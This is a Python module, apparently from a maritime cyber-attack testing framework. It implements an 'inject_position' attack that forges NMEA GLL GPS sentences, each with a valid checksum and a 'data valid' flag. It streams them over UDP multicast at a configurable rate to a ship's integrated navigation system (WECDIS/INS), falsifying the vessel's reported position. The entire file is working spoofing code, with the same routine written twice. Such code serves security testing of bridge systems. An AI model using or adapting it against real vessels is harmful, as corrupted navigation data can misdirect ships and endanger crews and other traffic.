import asyncio
import logging
import socket

from attacks import Attack, AttackNumberParameter
from settings import NMEA_HOST, NMEA_PORT, LISTEN_INTERFACE_WECDIS

import pynmea2
import datetime

class InjectPositionAttack(Attack):

  def __init__(self):
    super().__init__('inject_position', 'Inject position', 'Injects a fictitious position into the INS', [
      AttackNumberParameter('longitude_to_inject', 'Which longitude to inject', default = 8.848432),
      AttackNumberParameter('latitude_to_inject', 'Which latitude to inject', default = 44.458817),
      AttackNumberParameter('injection_hz', 'Frequency of the packets injection', default = 1.0),
    ])

  async def run(self, longitude_to_inject: float = 8.848432, latitude_to_inject: float = 44.458817, injection_hz: float = 1.0):
    loop = asyncio.get_running_loop()
    interval = 1.0 / injection_hz
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
        sock.setblocking(False)
        sock.bind((LISTEN_INTERFACE_WECDIS, 0))
        mreq_iface = socket.inet_aton(LISTEN_INTERFACE_WECDIS)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, mreq_iface)
        lat_val, lat_dir = to_nmea_latlon(latitude_to_inject,  is_lat=True)
        lon_val, lon_dir = to_nmea_latlon(longitude_to_inject, is_lat=False)
        utc_time = datetime.datetime.utcnow().strftime("%H%M%S")
        fields = [
            lat_val,    # latitude ddmm.mmmm
            lat_dir,    # N or S
            lon_val,    # longitude dddmm.mmmm
            lon_dir,    # E or W
            utc_time,   # hhmmss
            "A"         # status: A = data valid
        ]
        sentence = pynmea2.GLL("GP", "GLL", fields)
        sentence_bytes = sentence.render(checksum=True, dollar=True, newline=True).encode("ascii")
        while True:
            await loop.sock_sendto(sock, sentence_bytes, (NMEA_HOST.exploded, NMEA_PORT))
            self.logger.debug(sentence_bytes)
            await asyncio.sleep(interval)

def to_nmea_latlon(deg, is_lat=True):
    """Convert decimal degrees to NMEA ddmm.mmmm and direction."""
    d = int(abs(deg))
    m = (abs(deg) - d) * 60
    val = f"{d:02d}{m:07.4f}"
    if is_lat:
        dirc = "N" if deg >= 0 else "S"
    else:
        dirc = "E" if deg >= 0 else "W"
    return val, dirc


async def inject_position(longitude_to_inject: float = 8.848432, latitude_to_inject: float = 44.458817, injection_hz: float = 1.0):
    logger = logging.getLogger(inject_position.__name__)
    loop = asyncio.get_running_loop()
    interval = 1.0 / injection_hz
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as sock:
        sock.setblocking(False)
        sock.bind((LISTEN_INTERFACE_WECDIS, 0))
        mreq_iface = socket.inet_aton(LISTEN_INTERFACE_WECDIS)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, mreq_iface)
        lat_val, lat_dir = to_nmea_latlon(latitude_to_inject,  is_lat=True)
        lon_val, lon_dir = to_nmea_latlon(longitude_to_inject, is_lat=False)
        utc_time = datetime.datetime.utcnow().strftime("%H%M%S")
        fields = [
            lat_val,    # latitude ddmm.mmmm
            lat_dir,    # N or S
            lon_val,    # longitude dddmm.mmmm
            lon_dir,    # E or W
            utc_time,   # hhmmss
            "A"         # status: A = data valid
        ]
        sentence = pynmea2.GLL("GP", "GLL", fields)
        sentence_bytes = sentence.render(checksum=True, dollar=True, newline=True).encode("ascii")
        while True:
            await loop.sock_sendto(sock, sentence_bytes, (NMEA_HOST.exploded, NMEA_PORT))
            logger.debug(sentence_bytes)
            await asyncio.sleep(interval)
